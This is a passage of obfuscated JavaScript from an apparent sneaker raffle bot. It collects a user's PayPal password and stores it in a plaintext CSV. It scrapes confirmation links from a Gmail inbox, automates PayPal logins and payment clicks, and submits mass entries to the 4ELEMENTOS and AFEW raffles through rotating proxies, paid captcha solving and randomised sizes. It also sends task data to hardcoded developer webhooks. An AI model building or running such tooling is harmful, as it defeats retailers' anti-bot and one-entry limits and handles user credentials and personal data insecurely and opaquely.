        let _0x295ff2 = {}, _0x258fd1 = await _0x4a7744['get']('Email');
        _0x295ff2['Email'] = _0x258fd1['Email'];
        var _0x150c1e = Math['round'](Math['random']() * (_0x2911ba['length'] - 0x1));
        _0x295ff2['Proxy'] = _0x2911ba[_0x150c1e], console['clear'](), console['log']('Enter\x20your\x20paypal\x27s\x20password:\x0a');
        let _0x39e6a1 = await _0x4a7744['get']('Password');
        return _0x295ff2['Password'] = _0x39e6a1['Password'], _0x4a3989['appendFileSync']('../accounts/paypal.csv', '\x0a' + _0x295ff2['Email'] + ',' + _0x295ff2['Password'] + ',' + _0x295ff2['Proxy']), _0x295ff2;
    }
    let _0x2671b9 = await _0x553242();
    var _0x2f86e8 = [];
    console['clear'](), console['log']('How\x20many\x20links\x20would\x20you\x20like\x20to\x20verify\x20on\x20this\x20paypal?');
    let _0x5c8c48 = await _0x4a7744['get']('Amount'), _0x4561f0 = _0x5c8c48['Amount'];
    async function _0x29ba97() {
        let _0x13f70d = 0x0;
        var _0x59dfea = new _0x1aebaf({
            'user': _0x4562fb['masterMail'],
            'password': _0x4562fb['masterPassword'],
            'host': 'imap.gmail.com',
            'port': 0x3e1,
            'tls': !![],
            'autotls': 'always'
        });
        function _0x106a9b(_0x2ba636) {
            _0x59dfea['openBox']('INBOX', ![], _0x2ba636);
        }
        _0x59dfea['once']('ready', function () {
            _0x106a9b(function (_0x19aef2, _0x4b7563) {
                console['clear'](), console['log']('Looking\x20For\x20Links');
                if (_0x19aef2)
                    throw _0x19aef2;
                _0x59dfea['seq']['search']([
                    'UNSEEN',
                    [
                        'SUBJECT',
                        'PayPal'
                    ]
                ], function (_0x12e830, _0x3a9c24) {
                    if (!_0x3a9c24 || !_0x3a9c24['length'])
                        console['log'](_0x1211a5() + '\x20[' + _0x544ee1 + ']\x20No\x20mails\x20found'), _0x59dfea['end']();
                    else {
                        _0x3a9c24 = _0x3a9c24['slice'](0x0, _0x4561f0);
                        var _0xb7db01 = _0x59dfea['seq']['fetch'](_0x3a9c24, {
                            'bodies': '',
                            'markSeen': !![]
                        });
                        _0xb7db01['on']('message', function (_0x34172b, _0x189dcc) {
                            var _0x431f30 = '(#' + _0x189dcc + ')\x20';
                            _0x34172b['on']('body', function (_0x2bb254, _0x47b7e2) {
                                _0x372396(_0x2bb254, (_0x533799, _0x4dcc83) => {
                                    if (_0x4dcc83['subject'] == 'PayPal\x20Konto\x20bestätigen' || _0x4dcc83['subject'] == 'Confirm\x20your\x20PayPal\x20account') {
                                        mes = _0x4dcc83['text']['split']('[')[0x2];
                                        var _0xec35cf = mes['split'](']')[0x0];
                                        _0x2f86e8['push'](_0xec35cf);
                                    }
                                });
                            }), _0x34172b['once']('end', function () {
                                _0x13f70d++;
                            });
                        }), _0xb7db01['once']('error', function (_0x26ac32) {
                            console['log']('Fetch\x20error:\x20' + _0x26ac32);
                        }), _0xb7db01['once']('end', function () {
                            _0x59dfea['end']();
                        });
                    }
                });
            });
        }), _0x59dfea['once']('error', function (_0x503772) {
            console['log'](_0x1de0e8['red'](_0x503772['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
        }), _0x59dfea['once']('end', async function () {
        }), _0x59dfea['connect']();
    }
    try {
        _0x29ba97(), await _0x4d97b0(0xfa0), console['log']('Found\x20' + _0x2f86e8['length'] + '\x20Links\x20in\x20Mailbox');
    } catch {
        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x4d97b0(0xfa0);
    }
    var _0x3aa4ea;
    _0x81eb1('' + _0x544ee1);
    var _0x3a3ae7 = _0x2671b9['Proxy']['split'](':'), _0x4e3a90;
    try {
        _0x4e3a90 = await _0x3621d0['launch']({
            'userDataDir': 'sessions/' + _0x2671b9['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x3a3ae7[0x0] + ':' + _0x3a3ae7[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    } catch {
        _0x4e3a90 = await _0x3621d0['launch']({
            'userDataDir': 'sessions/' + _0x2671b9['Email'],
            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x3a3ae7[0x0] + ':' + _0x3a3ae7[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
    }
    try {
        console['log'](_0x1211a5() + '\x20[' + _0x544ee1 + ']\x20Getting\x20Session');
        const _0x3d35e2 = await _0x4e3a90['newPage']();
        await _0x3d35e2['authenticate']({
            'username': '' + _0x3a3ae7[0x2],
            'password': '' + _0x3a3ae7[0x3]
        }), await _0x3d35e2['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x3d35e2['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x1211a5() + '\x20[' + _0x544ee1 + ']\x20Logging\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x3d35e2['waitForSelector']('#email');
            let _0x2fac48 = await _0x3d35e2['$eval']('#email', _0x4a2cac => _0x4a2cac['getAttribute']('value'));
            if (_0x2fac48 == '') {
                await _0x3d35e2['type']('#email', _0x2671b9['Email']), await _0x4d97b0(0x1d3);
                let _0x47727f = await _0x3d35e2['$']('#splitPassword');
                _0x47727f && (await _0x3d35e2['click']('#btnNext'), await _0x4d97b0(0xa28)), await _0x3d35e2['type']('#password', _0x2671b9['Password']), await _0x4d97b0(0x35c), await _0x3d35e2['click']('#btnLogin');
            } else
                await _0x3d35e2['type']('#password', _0x2671b9['Password']), await _0x4d97b0(0x35c), await _0x3d35e2['click']('#btnLogin');
            await _0x3d35e2['waitForSelector']('#reactContainer__balance', { 'timeout': 0x493e0 }), console['log'](_0x1211a5() + '\x20[' + _0x544ee1 + ']\x20Successfully\x20logged\x20in'), await _0x4d97b0(0x2710);
        } catch (_0x536d0d) {
            throw new Error('Login\x20session\x20expired\x20' + _0x536d0d);
        }
        for (var _0x283d31 = 0x0; _0x283d31 < _0x2f86e8['length']; _0x283d31++) {
            console['log'](_0x1211a5() + '\x20[' + _0x544ee1 + ']\x20Task\x20' + (_0x283d31 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x81eb1(_0x544ee1 + '\x20Task\x20' + (_0x283d31 + 0x1) + '\x20/\x20' + _0x2f86e8['length']);
            const _0x4cba6f = await _0x4e3a90['newPage']();
            await _0x4cba6f['goto']('' + _0x2f86e8[_0x283d31], { 'waitUntil': 'networkidle2' }), await _0x4d97b0(0xbb8);
            try {
                const _0x43e871 = await _0x4cba6f['$']('#challenge-heading');
                _0x43e871 && (console['log'](_0x1211a5() + '\x20[' + _0x544ee1 + ']\x20Task\x20' + (_0x283d31 + 0x1) + '\x20:\x20' + _0x1de0e8['yellow']('2FA\x20Required')), await _0x4cba6f['waitForSelector']('.CheckoutButton_buttonWrapper_2VloF', { 'timeout': 0x493e0 }));
                await _0x4d97b0(0x9c40), await _0x4cba6f['waitForSelector']('#payment-submit-btn'), await _0x4cba6f['$eval']('#payment-submit-btn', _0x349980 => _0x349980['click']()), await _0x4cba6f['click']('#payment-submit-btn');
                try {
                    await _0x4cba6f['waitForSelector']('img[alt=\x22AFEW\x20STORE\x22]'), await _0x4d97b0(0x5dc), console['log'](_0x1de0e8['green'](_0x1211a5() + '\x20[' + _0x544ee1 + ']\x20Task\x20' + (_0x283d31 + 0x1) + '\x20:\x20Link\x20Verified'));
                } catch (_0x1b667c) {
                    _0x4b0002 = 'yes';
                    throw new Error('Payment\x20Rejected:\x20' + _0x1b667c['message']);
                } finally {
                    if (_0x4b0002 == 'yes' && _0x4da67d != 0x2) {
                        console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x544ee1['name'] + ']\x20Task\x20' + (_0x283d31 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4da67d + '\x20/\x205)')), _0x283d31 = _0x283d31 - 0x1, _0x4da67d = _0x4da67d + 0x1;
                        continue;
                    }
                    _0x4b0002 == 'yes' && _0x4da67d >= 0x2 && (_0x320814(csv[_0x283d31], _0x544ee1), _0x4b0002 = 'no', _0x4da67d = 0x0), await _0x4cba6f['close'](), await _0x4d97b0(0x4650);
                }
            } catch (_0x193e29) {
                console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x544ee1 + ']\x20Task\x20' + (_0x283d31 + 0x1) + '\x20:\x20' + _0x193e29));
            }
        }
    } catch (_0x4f1c51) {
        console['log'](_0x1de0e8['red']('' + _0x4f1c51));
    } finally {
        await _0x4e3a90['close']();
    }
}
const _0x2cac2b = [
    {
        'name': '4ELEMENTOS',
        'modules': [
            {
                'name': '4ELEMENTOS\x20Raffle\x20Entries',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x2e2ecf, _0x30d1cb, _0x4dfae9) {
                    _0x3621d0['use'](_0x509c12()), _0x3621d0['use'](_0x14703b({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x4562fb['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x1df51f = 0x0; _0x1df51f < _0x30d1cb['length']; _0x1df51f++) {
                        if (_0x590587 != 'yes')
                            var _0x590587 = '', _0x465c49 = 0x0;
                        var _0x1bb9fc;
                        try {
                            await _0x43eceb(_0x30d1cb, _0x1df51f);
                        } catch {
                            _0x590587 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x81eb1(_0x2e2ecf['name'] + '\x20Task\x20' + (_0x1df51f + 0x1) + '\x20/\x20' + _0x30d1cb['length'] + '\x20||\x20File:\x20' + _0x367847 + '\x20Proxies:\x20' + _0x259b4b);
                        var _0x4cf496 = [
                            '40',
                            '40,5',
                            '41',
                            '42',
                            '42,5',
                            '43',
                            '44',
                            '45',
                            '45,5',
                            '46',
                            '47',
                            '47,5',
                            '48'
                        ], _0x2ece2f = Math['round'](Math['random']() * (_0x4cf496['length'] - 0x1));
                        _0x30d1cb[_0x1df51f]['Size'] == 'RANDOM' && (_0x30d1cb[_0x1df51f]['Size'] = _0x4cf496[_0x2ece2f]);
                        var _0x1ae5a9 = Math['round'](Math['random']() * (_0x4dfae9['length'] - 0x1)), _0x5652ee = _0x4dfae9[_0x1ae5a9]['split'](':'), _0x2374da;
                        try {
                            _0x2374da = await _0x3621d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5652ee[0x0] + ':' + _0x5652ee[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2374da = await _0x3621d0['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5652ee[0x0] + ':' + _0x5652ee[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            console['log'](_0x1211a5() + '\x20[' + _0x2e2ecf['name'] + ']\x20Task\x20' + (_0x1df51f + 0x1) + '\x20:\x20Getting\x20Session');
                            const _0x37f437 = await _0x2374da['newPage']();
                            await _0x37f437['authenticate']({
                                'username': '' + _0x5652ee[0x2],
                                'password': '' + _0x5652ee[0x3]
                            }), await _0x37f437['setRequestInterception'](!![]), _0x37f437['on']('request', _0x230129 => {
                                _0x230129['resourceType']() === 'image' || _0x230129['resourceType']() === 'font' || _0x230129['resourceType']() === 'media' ? _0x230129['abort']() : _0x230129['continue']();
                            }), await _0x37f437['goto'](_0x30d1cb[_0x1df51f]['Url'], { 'waitUntil': 'networkidle2' }), console['log'](_0x1211a5() + '\x20[' + _0x2e2ecf['name'] + ']\x20Task\x20' + (_0x1df51f + 0x1) + '\x20:\x20Starting\x20Entry'), await _0x37f437['waitForSelector']('#accept-all-gdpr'), await _0x37f437['click']('#accept-all-gdpr'), await _0x37f437['waitForSelector']('#raffles-product'), await _0x4d97b0(0x3e8), await _0x37f437['$eval']('#raffles-product', _0x2fc1c1 => _0x2fc1c1['click']()), await _0x4d97b0(0x1388), await _0x37f437['waitForSelector']('.fancybox-inner\x20>\x20iframe');
                            var _0x9f133b = await _0x37f437['$']('.fancybox-inner\x20>\x20iframe'), _0x4d4c74 = await _0x9f133b['contentFrame']();
                            console['log'](_0x1211a5() + '\x20[' + _0x2e2ecf['name'] + ']\x20Task\x20' + (_0x1df51f + 0x1) + '\x20:\x20Checking\x20Information'), await _0x4d4c74['waitForSelector']('input[name=\x22sm-form-email\x22]'), await _0x4d97b0(0x1f4), await _0x4d4c74['type']('input[name=\x22sm-form-email\x22]', _0x30d1cb[_0x1df51f]['Email']), await _0x4d97b0(0xc8), await _0x4d4c74['type']('input[name=\x22sm-form-name\x22]', _0x30d1cb[_0x1df51f]['FirstName'] + '\x20' + _0x30d1cb[_0x1df51f]['LastName']), await _0x4d97b0(0xc8), await _0x4d4c74['type']('input[name=\x22sm-form-street\x22]', _0x30d1cb[_0x1df51f]['Address1'] + '\x20' + _0x30d1cb[_0x1df51f]['HouseNumber'] + '\x20' + _0x30d1cb[_0x1df51f]['Address2']), await _0x4d97b0(0xc8), await _0x4d4c74['type']('input[name=\x22sm-form-city\x22]', _0x30d1cb[_0x1df51f]['City']), await _0x4d97b0(0xc8), await _0x4d4c74['type']('input[name=\x22sm-form-province\x22]', _0x30d1cb[_0x1df51f]['State']), await _0x4d97b0(0xc8), await _0x4d4c74['type']('input[name=\x22sm-form-zip\x22]', _0x30d1cb[_0x1df51f]['Zip']), await _0x4d97b0(0xc8), await _0x4d4c74['type']('input[name=\x22sm-form-country\x22]', _0x30d1cb[_0x1df51f]['Country']), await _0x4d97b0(0xc8), await _0x4d4c74['type']('input[name=\x22sm-form-phone\x22]', _0x30d1cb[_0x1df51f]['Phone']), await _0x4d97b0(0xc8), await _0x4d4c74['type']('input[name=\x22sm-cst.instagram_user\x22]', _0x30d1cb[_0x1df51f]['Follower']), await _0x4d97b0(0xc8), await _0x4d4c74['type']('input[name=\x22sm-cst.size\x22]', _0x30d1cb[_0x1df51f]['Size']), await _0x4d97b0(0x1f4), await _0x4d4c74['click']('.icheckbox_simple-custom.icheckbox--CONSENT'), await _0x4d97b0(0x1f4), await _0x4d4c74['click']('.icheckbox_simple-custom'), await _0x4d97b0(0x1f4), console['log'](_0x1211a5() + '\x20[' + _0x2e2ecf['name'] + ']\x20Task\x20' + (_0x1df51f + 0x1) + '\x20:\x20Sending\x20Request'), await _0x4d4c74['$eval']('form', _0x4feef3 => _0x4feef3['submit']()), console['log'](_0x1de0e8['green'](_0x1211a5() + '\x20[' + _0x2e2ecf['name'] + ']\x20Task\x20' + (_0x1df51f + 0x1) + '\x20:\x20Raffle\x20Entered!')), _0x590587 = '';
                            var _0x51b099 = await _0x4ef820(_0x30d1cb[_0x1df51f], _0x2e2ecf, 'dev', ![]), _0x15de6d = await _0x4ef820(_0x30d1cb[_0x1df51f], _0x2e2ecf, 'pub', ![]);
                            const _0x8d0847 = {
                                'succesDEVMSG': { 'embeds': [_0x51b099] },
                                'succesPUBMSG': { 'embeds': [_0x15de6d] }
                            };
                            try {
                                _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x8d0847['succesDEVMSG']), await _0x4d97b0(0xc8), await _0xa7b872(_0x27bacd, _0x8d0847['succesDEVMSG']), await _0x4d97b0(0xc8), await _0xa7b872(_0x3f583b, _0x8d0847['succesPUBMSG']);
                            } catch (_0xf209c7) {
                                console['log'](_0x1de0e8['yellow'](_0x1211a5() + '\x20[' + _0x2e2ecf['name'] + ']\x20Task\x20' + (_0x1df51f + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xf209c7));
                            }
                        } catch (_0x44257d) {
                            console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x2e2ecf['name'] + ']\x20Task\x20' + (_0x1df51f + 0x1) + '\x20:\x20' + _0x44257d)), _0x1bb9fc = '' + _0x44257d;
                            var _0xdec0d4 = await _0x4ef820(_0x30d1cb[_0x1df51f], _0x2e2ecf, 'dev', !![], _0x1bb9fc), _0x51b099 = await _0x4ef820(_0x30d1cb[_0x1df51f], _0x2e2ecf, 'dev', ![]), _0x15de6d = await _0x4ef820(_0x30d1cb[_0x1df51f], _0x2e2ecf, 'pub', ![]);
                            const _0x3fdcda = {
                                'succesDEVMSG': { 'embeds': [_0x51b099] },
                                'succesPUBMSG': { 'embeds': [_0x15de6d] }
                            };
                            _0x3fdcda['errorDEV'] = { 'embeds': [_0xdec0d4] }, _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x3fdcda['errorDEV']), await _0xa7b872(_0x5f83c7, _0x3fdcda['errorDEV']), _0x44257d != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x590587 = 'yes');
                        } finally {
                            _0x2374da['close']();
                            if (_0x590587 == 'yes' && _0x465c49 != 0x5 && _0x1bb9fc != 'Size\x20Not\x20Found') {
                                console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x2e2ecf['name'] + ']\x20Task\x20' + (_0x1df51f + 0x1) + '\x20:\x20Retrying\x20(' + _0x465c49 + '\x20/\x205)\x20')), _0x1df51f = _0x1df51f - 0x1, _0x465c49 = _0x465c49 + 0x1;
                                continue;
                            }
                            _0x590587 == 'yes' && _0x465c49 >= 0x5 && (_0x320814(_0x30d1cb[_0x1df51f], _0x2e2ecf), _0x590587 = 'no', _0x465c49 = 0x0), console['log'](_0x1211a5() + '\x20[' + _0x2e2ecf['name'] + ']\x20Waiting\x20for\x20' + _0x4562fb['delay'] + '\x20ms'), await _0x4d97b0(_0x4562fb['delay']);
                        }
                    }
                }
            },
            {
                'name': '4ELEMENTOS\x20Link\x20Verification',
                'store': '4ELEMENTOS',
                'logo': 'https://cdn.lovesavingsgroup.com/logos/4elementos.jpg',
                'function': async function (_0x7a503f, _0x44ef5c) {
                    var _0x3986c0 = [];
                    async function _0x508aa2() {
                        var _0x5726d8 = new _0x1aebaf({
                            'user': _0x4562fb['masterMail'],
                            'password': _0x4562fb['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x467dc1(_0x2252e2) {
                            _0x5726d8['openBox']('INBOX', ![], _0x2252e2);
                        }
                        _0x5726d8['once']('ready', function () {
                            _0x467dc1(function (_0x539bd4, _0x234646) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x539bd4)
                                    throw _0x539bd4;
                                _0x5726d8['seq']['search'](['UNSEEN'], function (_0x28af06, _0x2d0262) {
                                    if (!_0x2d0262 || !_0x2d0262['length'])
                                        console['log'](_0x1211a5() + '\x20[' + _0x7a503f['name'] + ']\x20No\x20mails\x20found'), _0x5726d8['end']();
                                    else {
                                        var _0x671805 = _0x5726d8['seq']['fetch'](_0x2d0262, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x671805['on']('message', function (_0x37281e, _0x1f8a3c) {
                                            var _0xb150fa = '(#' + _0x1f8a3c + ')\x20';
                                            _0x37281e['on']('body', function (_0x1c2949, _0x216eb0) {
                                                _0x372396(_0x1c2949, (_0xb8d702, _0xf8a5cb) => {
                                                    if (_0xf8a5cb['subject'] == 'Confirm\x20your\x20subscription\x20to\x20the\x20Raffle\x20||\x20Confirma\x20tu\x20suscripción\x20al\x20Raffle') {
                                                        var _0x33de64 = _0xf8a5cb['html']['split']('\x0a');
                                                        for (var _0x115785 = 0x0; _0x115785 < _0x33de64['length']; _0x115785++) {
                                                            if (_0x33de64[_0x115785]['includes']('salesmanago') && _0x33de64[_0x115785]['includes']('<td') && _0x33de64[_0x115785]['includes']('href')) {
                                                                var _0x548bf2 = _0x33de64[_0x115785]['split']('href=\x22'), _0x5759ac = _0x548bf2[0x1]['split']('\x22')[0x0];
                                                                _0x3986c0['push'](_0x5759ac);
                                                                break;
                                                            }
                                                        }
                                                    }
                                                });
                                            }), _0x37281e['once']('end', function () {
                                            });
                                        }), _0x671805['once']('error', function (_0x599deb) {
                                            console['log']('Fetch\x20error:\x20' + _0x599deb);
                                        }), _0x671805['once']('end', function () {
                                            _0x5726d8['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x5726d8['once']('error', function (_0x82f8c8) {
                            console['log'](_0x1de0e8['red'](_0x82f8c8['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x5726d8['once']('end', async function () {
                        }), _0x5726d8['connect']();
                    }
                    async function _0x1390f0(_0x176c83, _0x2a63eb, _0x11b072) {
                        for (var _0x564f22 = 0x0; _0x564f22 < _0x2a63eb['length']; _0x564f22++) {
                            async function _0x4da66c(_0x53fd26, _0x57c55f, _0x440b06, _0x56ec02, _0x5273c8) {
                                var _0x20f459, _0x1c8402 = {}, _0x8c82f = [], _0x4e438d = {}, _0x25d040 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x347886 = Math['round'](Math['random']() * (_0x25d040['length'] - 0x1));
                                _0x56ec02[_0x53fd26]['Size'] == 'RANDOM' && (_0x56ec02[_0x53fd26]['Size'] = _0x25d040[_0x347886]);
                                !_0x56ec02 && (_0x56ec02 = {});
                                if (_0x4562fb['useRandomProxy'] = ![])
                                    var _0x461354 = _0x5273c8[_0x53fd26]['split'](':');
                                else
                                    var _0x14cd8e = Math['round'](Math['random']() * (_0x5273c8['length'] - 0x1)), _0x461354 = _0x5273c8[_0x14cd8e]['split'](':');
                                var _0x1af7e7 = {
                                    'jar': _0x21e44c,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x440b06['url'],
                                    'headers': _0x440b06['headers'],
                                    'body': JSON['stringify'](_0x1c8402),
                                    'proxy': 'http://' + _0x461354[0x2] + ':' + _0x461354[0x3] + '@' + _0x461354[0x0] + ':' + _0x461354[0x1]
                                };
                                return _0x57c55f != 'ver' && (_0x1af7e7['url'] = _0x440b06['url'], _0x1af7e7['headers'] = _0x440b06['headers']), _0x57c55f == 'ver' && (_0x1af7e7['method'] = 'GET', _0x1af7e7['url'] = _0x56ec02[_0x53fd26]), new Promise(function (_0x31f890, _0x2905f8) {
                                    callback = async (_0x2073ff, _0x417168, _0x29934e) => {
                                        if (!_0x2073ff && _0x417168['statusCode'] == 0xca || !_0x2073ff && _0x417168['statusCode'] == 0xc8) {
                                            if (_0x57c55f != 'ver') {
                                                var _0x1b5009 = await _0x4ef820(_0x56ec02[_0x53fd26], _0x440b06, 'dev', ![]), _0x22e2cb = await _0x4ef820(_0x56ec02[_0x53fd26], _0x440b06, 'pub', ![]);
                                                const _0x1f41d5 = {
                                                    'succesDEVMSG': { 'embeds': [_0x1b5009] },
                                                    'succesPUBMSG': { 'embeds': [_0x22e2cb] }
                                                };
                                                if (_0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '')
                                                    try {
                                                        await _0xa7b872(_0x4562fb['webhook'], _0x1f41d5['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x4d97b0(0xc8), await _0xa7b872(_0x27bacd, _0x1f41d5['succesDEVMSG']), await _0x4d97b0(0xc8);
                                                try {
                                                    await _0xa7b872(_0x3f583b, _0x1f41d5['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x3b7ca0(_0x56ec02[_0x53fd26], _0x440b06);
                                            }
                                            _0x31f890(console['log'](_0x1de0e8['green'](_0x1211a5() + '\x20[' + _0x440b06['name'] + ']\x20Task\x20' + (_0x53fd26 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x57c55f != 'ver') {
                                                var _0xc1c429 = '' + _0x2073ff, _0x57104c = await _0x4ef820(_0x56ec02[_0x53fd26], _0x440b06, 'dev', !![], _0xc1c429), _0x4bec59 = {};
                                                _0x4bec59['errorDEV'] = { 'embeds': [_0x57104c] }, _0x320814(_0x56ec02[_0x53fd26], _0x440b06), _0x4562fb['webhook'] != undefined && _0x4562fb['webhook'] != '' && await _0xa7b872(_0x4562fb['webhook'], _0x4bec59['errorDEV']), await _0xa7b872(_0x5f83c7, _0x4bec59['errorDEV']);
                                            }
                                            _0x2905f8(console['log'](_0x1de0e8['red'](_0x1211a5() + '\x20[' + _0x440b06['name'] + ']\x20Task\x20' + (_0x53fd26 + 0x1) + ':\x20' + _0x2073ff)));
                                        }
                                    };
                                    try {
                                        _0x57c55f != 'ver' ? console['log'](_0x1211a5() + '\x20[' + _0x440b06['name'] + ']\x20Task\x20' + (_0x53fd26 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x1c8402['data']['attributes']['email']) : console['log'](_0x1211a5() + '\x20[' + _0x440b06['name'] + ']\x20Task\x20' + (_0x53fd26 + 0x1) + ':\x20Fetching\x20Response'), _0xe9845d(_0x1af7e7, callback);
                                    } catch (_0x438c03) {
                                        console['log'](_0x1211a5() + '\x20Task\x20' + (_0x53fd26 + 0x1) + ':\x20' + _0x438c03);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x4da66c(_0x564f22, 'ver', _0x176c83, _0x2a63eb, _0x11b072), console['log'](_0x1211a5() + '\x20[' + _0x176c83['name'] + ']\x20Sleeping\x20for\x20' + _0x4562fb['delay'] + '\x20ms'), await _0x4d97b0(_0x4562fb['delay']);
                            } catch (_0x167c72) {
                            }
                        }
                    }
                    try {
                        _0x508aa2(), await _0x4d97b0(0xfa0), console['log']('Found\x20' + _0x3986c0['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..');
                    }
                    await _0x1390f0(_0x7a503f, _0x3986c0, _0x44ef5c);
                }
            }
        ]
    },
    {
        'name': 'AFEW\x20Store',
        'modules': [{
            'name': 'AFEW\x20Raffle\x20Entries',
            'store': 'AFEW',
            'logo': 'https://d19kzigy6tpscu.cloudfront.net/media/CACHE/images/logo_thumbnail/afew_logo_100x100_1647428869.png',
            'function': async function (_0x1a148e, _0x5a1962, _0x2dcafb) {
                for (var _0x1714b7 = 0x0; _0x1714b7 < _0x5a1962['length']; _0x1714b7++) {
                    _0x4562fb['AfewDelay'] = _0x4562fb['delay'];
                    var _0x14dfe4;
                    if (_0x3e3ee2 != 'yes')
                        var _0x3e3ee2 = '', _0x552df9 = 0x0;
                    var _0x8b9a62 = _0x5a1962[_0x1714b7]['Url'], _0x1e1c34 = _0x5a1962[_0x1714b7];
                    _0x81eb1(_0x1a148e['name'] + '\x20Task\x20' + (_0x1714b7 + 0x1) + '\x20/\x20' + _0x5a1962['length'] + '\x20||\x20File:\x20' + _0x367847 + '\x20Proxies:\x20' + _0x259b4b);
                    try {
                        await _0x43eceb(_0x5a1962, _0x1714b7);
                    } catch {
                        _0x3e3ee2 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    async function _0x4d1b11(_0x4dcfa0) {
                        const _0x6378ae = _0x4a3989['readFileSync']('../successful-tasks.csv', 'utf8'), _0x2d82d1 = _0x4dbee3['parse'](_0x6378ae, { 'header': !![] })['data'];
                        let _0x2ec326 = ![];
                        for (var _0x63a1a7 of _0x2d82d1) {
                            if (_0x63a1a7['Url'] == _0x4dcfa0['Url'] && _0x63a1a7['Email'] == _0x4dcfa0['Email']) {
                                _0x2ec326 = !![];
                                break;
                            }
                        }
                        return _0x2ec326;
                    }
                    if (await _0x4d1b11(_0x5a1962[_0x1714b7]) == !![]) {
                        console['log'](_0x1211a5() + '\x20[' + _0x1a148e['name'] + ']\x20Task\x20' + (_0x1714b7 + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task');
                        continue;
                    }
                    var _0x735561 = await _0x4ef820(_0x5a1962[_0x1714b7], _0x1a148e, 'dev', ![]), _0x52632a = await _0x4ef820(_0x5a1962[_0x1714b7], _0x1a148e, 'pub', ![]);
                    const _0x1250df = {
                        'succesDEVMSG': { 'embeds': [_0x735561] },
                        'succesPUBMSG': { 'embeds': [_0x52632a] }
                    };
                    if (_0x5a1962[_0x1714b7]['Email'] == '' || _0x5a1962[_0x1714b7]['FirstName'] == '' || _0x5a1962[_0x1714b7]['LastName'] == '' || _0x5a1962[_0x1714b7]['Country'] == '' || _0x5a1962[_0x1714b7]['Size'] == '' || _0x5a1962[_0x1714b7]['Address1'] == '' || _0x5a1962[_0x1714b7]['Zip'] == '') {
                        console['log'](_0x1211a5() + '\x20[' + _0x1a148e['name'] + ']\x20Task\x20' + (_0x1714b7 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x4562fb['useRandomProxy'] = ![])
                        var _0x3cb497 = _0x2dcafb[_0x1714b7]['split'](':');
                    else
                        var _0x28b001 = Math['round'](Math['random']() * (_0x2dcafb['length'] - 0x1)), _0x3cb497 = _0x2dcafb[_0x28b001]['split'](':');
                    var _0x3de54f;
                    try {
                        _0x3de54f = await _0x3621d0['launch']({
